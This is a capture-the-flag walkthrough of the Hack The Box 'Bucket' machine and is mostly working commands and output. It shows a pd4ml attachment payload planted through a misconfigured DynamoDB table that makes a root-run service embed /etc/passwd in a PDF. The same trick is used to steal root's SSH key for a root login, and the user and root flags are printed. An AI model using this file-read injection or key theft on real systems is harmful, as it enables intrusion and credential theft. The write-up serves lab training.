```bash
roy@bucket:~$ ls -la
total 32
drwxr-xr-x 4 roy  roy  4096 May  8 07:56 .
drwxr-xr-x 3 root root 4096 Sep 16  2020 ..
lrwxrwxrwx 1 roy  roy     9 Sep 16  2020 .bash_history -> /dev/null
-rw-r--r-- 1 roy  roy   220 Sep 16  2020 .bash_logout
-rw-r--r-- 1 roy  roy  3771 Sep 16  2020 .bashrc
drwx------ 2 roy  roy  4096 May  8 07:56 .cache
-rw-r--r-- 1 roy  roy   807 Sep 16  2020 .profile
drwxr-xr-x 3 roy  roy  4096 Sep 24  2020 project
-r-------- 1 roy  roy    33 May  7 19:29 user.txt
roy@bucket:~$ cat user.txt 
3f48bf003e518859972582400ce52df9
```

# Enumeration -

- Port 8000 running as root -
```bash
<VirtualHost 127.0.0.1:8000>
        <IfModule mpm_itk_module>
                AssignUserId root root
        </IfModule>
        DocumentRoot /var/www/bucket-app
</VirtualHost>
```

- Checking the bucket-app -
```bash
roy@bucket:/var/www/bucket-app$ ls -la
total 856
drwxr-x---+  4 root root   4096 Feb 10 12:29 .
drwxr-xr-x   4 root root   4096 Feb 10 12:29 ..
-rw-r-x---+  1 root root     63 Sep 23  2020 composer.json
-rw-r-x---+  1 root root  20533 Sep 23  2020 composer.lock
drwxr-x---+  2 root root   4096 Feb 10 12:29 files
-rwxr-x---+  1 root root  17222 Sep 23  2020 index.php
-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
drwxr-x---+ 10 root root   4096 Feb 10 12:29 vendor
```

- Checking index.php (running on port 8000)  -

![[Pasted image 20210508042731.png]]

On a POST request with the `action` parameter set to “get\_alerts”, it will query the DynamoDbClient for alerts that contain “Ransomware” in the title column. For each result, it will create a random filename in `files` and write the contents of the data column into that file.

Then it calls the [pd4ml](https://pd4ml.com/) Jar on that temporary HTML file to convert it to PDF.

## >>How to attach using pd4html -

LINK - https://pd4ml.com/cookbook/pdf-attachments.htm

Example -
1.  <pd4ml:attachment src\="http://pd4ml.com/i/logo.png" 
2.   description\="attachment sample" icon\="Paperclip"/>

## >> Creating a table in dynamodb -

LINK - https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/getting-started-step-1.html

Example -
```bash
aws dynamodb create-table \
    --table-name Music \
    --attribute-definitions \
        AttributeName=Artist,AttributeType=S \
        AttributeName=SongTitle,AttributeType=S \
    --key-schema \
        AttributeName=Artist,KeyType=HASH \
        AttributeName=SongTitle,KeyType=RANGE \
--provisioned-throughput \
        ReadCapacityUnits=10,WriteCapacityUnits=5		
```

# >>Exploitation -

- Connecting through ssh via port forwarding to access port 8000 -

###  `ssh roy@10.10.10.212 -L 8000:localhost:8000`
![[Pasted image 20210508044731.png]]

- Checking the webpage -

![[Pasted image 20210508044938.png]]

- Creating Table -

```bash
aws --endpoint-url http://s3.bucket.htb dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
--provisioned-throughput \
        ReadCapacityUnits=10,WriteCapacityUnits=5		
```


- Running the command -

```bash
root@napster:~/Documents/HTB/Bucket# aws --endpoint-url http://s3.bucket.htb dynamodb create-table     --table-name alerts     --attribute-definitions         AttributeName=title,AttributeType=S     --key-schema         AttributeName=title,KeyType=HASH --provisioned-throughput         ReadCapacityUnits=10,WriteCapacityUnits=5
{
    "TableDescription": {
        "AttributeDefinitions": [
            {
                "AttributeName": "title",
                "AttributeType": "S"
            }
        ],
        "TableName": "alerts",
        "KeySchema": [
            {
                "AttributeName": "title",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": 1620464597.109,
        "ProvisionedThroughput": {
            "LastIncreaseDateTime": 0.0,
            "LastDecreaseDateTime": 0.0,
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 10,
            "WriteCapacityUnits": 5
        },
        "TableSizeBytes": 0,
        "ItemCount": 0,
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
    }
}
root@napster:~/Documents/HTB/Bucket# aws --endpoint-url http://s3.bucket.htb dynamodb list-tables
{
    "TableNames": [
        "alerts",
        "users"
    ]
}
```

- Creating a ransomware.json file to upload  to the table -
```bash
{"title":
        {"S": "Ransomware"},
        "data":
        {
                "S":"<html><pd4ml:attachment src='/etc/passwd' description='attachment sample' icon='Paperclip'/>"
        }
}
```

- Uploading the file -

```bash
root@napster:~/Documents/HTB/Bucket# aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item file://ransomware.json
{
    "ConsumedCapacity": {
        "TableName": "alerts",
        "CapacityUnits": 1.0
    }
}
```

- Doing a POST request on get_alerts -

```bash
root@napster:~/Documents/HTB/Bucket# curl -X POST -d "action=get_alerts" http://127.0.0.1:8000
```

- Visiting the webpage and downloading the attachment -

![[Pasted image 20210508052811.png]]

-  /etc/passwd -

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
roy:x:1000:1000:,,,:/home/roy:/bin/bash
```

- Grabbing the ssh keys of root using the above -

![[Pasted image 20210508060732.png]]

- Logging in and grabbing root.txt -

```bash
root@napster:~/Documents/HTB/Bucket# ssh -i id_rsa root@10.10.10.212
root@bucket:~# ls -la
total 76
drwx------ 11 root root 4096 Sep 24  2020 .
drwxr-xr-x 21 root root 4096 Feb 10 12:49 ..
drwxr-xr-x  2 root root 4096 Sep 23  2020 .aws
drwxr-xr-x  3 root root 4096 Sep 16  2020 backups
lrwxrwxrwx  1 root root    9 Sep  4  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  3 root root 4096 Sep 23  2020 .cache
drwxr-xr-x  3 root root 4096 Sep 21  2020 .config
-rw-r--r--  1 root root  217 Sep 24  2020 docker-compose.yml
drwxr-xr-x  7 root root 4096 May  8 10:11 files
drwxr-xr-x  3 root root 4096 Sep 21  2020 .java
drwxr-xr-x  3 root root 4096 Sep 24  2020 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rwxr-xr-x  1 root root 1694 Sep 24  2020 restore.php
-rwxr-xr-x  1 root root  381 Sep 24  2020 restore.sh
-r--------  1 root root   33 May  7 19:29 root.txt
drwxr-xr-x  3 root root 4096 May 18  2020 snap
drwx------  2 root root 4096 Sep 21  2020 .ssh
-rwxr-xr-x  1 root root  340 Sep 24  2020 start.sh
-rwxr-xr-x  1 root root  182 Sep 24  2020 sync.sh
root@bucket:~# cat root.txt 
4652220e0291dbc366eb58d7606c1739
```